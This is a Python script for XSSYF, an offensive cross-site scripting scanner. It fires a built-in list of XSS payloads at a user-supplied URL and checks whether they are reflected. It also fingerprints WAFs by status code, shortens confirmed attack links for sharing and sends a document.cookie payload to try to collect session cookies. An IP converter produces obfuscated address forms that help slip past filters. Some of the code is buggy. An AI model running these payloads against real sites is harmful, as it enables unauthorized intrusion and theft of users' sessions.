#!/usr/bin/env python3

import urllib.request
from urllib.error import URLError
import urllib.parse
import time
import re
import sys
import colorama
import gdshortener
import requests
import custom
from colorama import Fore, Back, Style

#We can use (https://xss-game.appspot.com/level1/frame?query=) for testing
#Codded By Yehia Mamdouh

###Cross Site Scripting Payloads###
xss_attack = ["<script>alert('xssyf')</script>",
              "1<ScRiPt>prompt(999691)</ScRiPt>",
              "//1<ScRiPt>prompt(919397)</ScRiPt>",
              "%22%3Cscript%3Ealert%28%27XSSYF%27%29%3C%2Fscript%3E",
              "'\"</scRipt><scRipt>alert('xssyf')</scRipt>",
              "1%253CScRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E", 
                "<scRiPt>alert(1);</scrIPt>",
               "\"><scRipt>alert('xssyf')</scRipt>",
                "'';!--\"<XSS>=&{()}",
                "<q/oncut=alert(1)>",
                "<script>alert(\"xssyf\")</script>",
                "\";alert(1)//"]

#Function in case of Vulnerability Confirmation
def xxs2(exploi):
    print ("")
    print (Fore.RED + " Testing:",host+exploi)
    try:
        if  host != 0:
            sourc = urllib.request.urlopen(host+exploi).read()
            print (" Source Length Before:",len(host))
            print (" Source Length After :",len(sourc))

        if re.search("xss", sourc.lower().decode('utf-8')) != None:
            print (Fore.RED + "\n [!]XSS:",host+exploi,"\n")

    except urllib.error.HTTPError as e:
        print (Fore.GREEN + "[-] Not Vulnerable (XSS) ")
        ##Detecting WAF if Exist
        if e.code == 403:
            print ("")
            print (" WAF Detected => (Maybe Mod_Security)")
        elif e.code == 999:
            print ("")
            print (" WAF Detected => WebKnight")
            time.sleep(5)
        elif e.code == 419:
            print ("")
            print (" WAF Detected => F5 BIG IP")
        else:
            print ("")
            print (" WAF Not Found")
            print ("")

        pass

####### Print Menu and Exmaple ########      
print (Fore.CYAN + "\n")
print ("\t#####################################################################")
print ("\t#                                                                   #")
print ("\t# ___   ___      _______.     _______.____    ____  _____           #")
print ("\t# \  \ /  /     /       |    /       |\   \  /   /  | |__|          #")
print ("\t#  \  V  /     |   (----`   |   (----` \   \/   /   | |__           #")
print ("\t#   >   <       \   \        \   \      \_    _/    | |__|          #")
print ("\t#  /  .  \  .----)   |   .----)   |       |  |      | |             #")
print ("\t# /__/ \__\ |_______/    |_______/        |__|      |_|             #")        
print ("\t#                                                                   #")                                                                                                #"
print ("\t#      XSSY (Cross Site Scripting) Coded by (@Yehia1mamdouh)        #")
print ("\t#               7dd022053c8a35169305380371a4d577                    #")
print ("\t#####################################################################")

print ("")
print (" XSSYF: Forget Browser And Alert Box ")
print ("")

host = input(" Enter A Vulnerable Link: ")
res1= urllib.request.urlopen(host)
html = res1.read().decode('utf-8')

print (30 * '-')
print (" XSSYF - M E N U")
print (30 * '-')
print (" 1. XSS Vulnerability Confirmation")
print (" 2. IP Converter")
print ("")

choice = input(' Enter your choice [1] : ')
print ("")
print (res1.info())
myfile = res1.read()
print ("")

def ipconvert():
    import binascii
    import socket, struct
    ip = input("Enter an IP: ")
    print ("")
    nn = struct.unpack("!I", socket.inet_aton(ip))[0]
    cc = binascii.hexlify(socket.inet_aton(ip)).decode('utf-8')
    dd = binascii.hexlify(socket.inet_aton(ip)).upper().decode('utf-8')
    ip = ip.split('.')
    ff = '.'.join(('0x'+hex(int(i))[2:] for i in ip))
    ss = '%04o.%04o.%04o.%04o' % tuple(map(int, ip))

    print ("###### Converted Addres ######")
    print ("")
    print (Fore.GREEN + " (Hex Lower) " + cc)
    print ("")
    print (Fore.GREEN + " (Hex Upper) " + dd)
    print ("")
    print (Fore.GREEN + " (HEX  Addr) " + ff)
    print ("")
    print (Fore.RED +   " (Dword Addr) ",  nn)
    print ("")
    print (Fore.BLUE +  " (Octal Addr)", ss)
    sys.exit()

def XSSConfirm():
    settimes = input(" Set Timeout: ")
    print (" Scanning The Host:",host)
    print ("")
    print (Fore.RED + " [+] Loaded:",len(xss_attack),"payloads\n")
    try:
        for exploi in xss_attack:
            time.sleep(int (settimes))
            xxs2(exploi.replace("\n",""))

            ###Confirm by Searching Payload in Web Page###
            
            heer = custom.check()
            bb = " [+] Confirmed Payload Found in Web Page Code"
            cc = " [-] False Positive"
            try:
                mam = urllib.request.urlopen(host+exploi).read()
                found = False
                for payload in heer.hit:
                    if payload in mam.decode('utf-8'):
                        found = True
                if found:
                    print ("")
                    print (Fore.YELLOW + bb)
                    s = gdshortener.ISGDShortener()
                    short = s.shorten(host+exploi)[0]
                    print ("")
                    print (Fore.GREEN+ " URL Shortener is", short)
                    print ("")

                    #Getting COKKIES
                    import http.cookiejar as cookielib
                    cj = cookielib.CookieJar()
                    xss_cookie = "%3cscript%3ealert(document.cookie)%3c/script%3e"
                    url1 = (host+xss_cookie)
                    req = urllib.request.Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                    f = urllib.request.urlopen(req)
                    html = f.read()
                    print (" Excute document.cookie")
                    time.sleep (3)
                    print ("")
                    for cookie in cj:
                        print (Fore.CYAN + " ==>", cookie)
                else:
                    print ("")
                    print (Fore.GREEN + cc)
            except urllib.error.HTTPError as e:
                print (Fore.GREEN + "[-] Not Vulnerable (XSS) ", e)
    except KeyboardInterrupt:
        print ("")

if ('2' in choice):
    print (ipconvert())

if ('1' in choice):
    print (XSSConfirm())

else:
    print("Choose Right Answer")

print ("")
print ("")
codehtml = input(" Save Page CODE:? ")
sas = host
if ('y' in codehtml):
    urllib.request.urlretrieve(sas,'./scan_js.txt')
else:
    pass

print ("")
codehtml = input(" Print HTML CODE:? ")
if ('y' in codehtml):
    data = urllib.request.urlopen(host)
    print (data.info())
    myfile = data.read().decode('utf-8')
    print ("")
    print (Fore.WHITE + myfile)
else:
    print ("")
    print (Fore.CYAN + " Happy Hunting")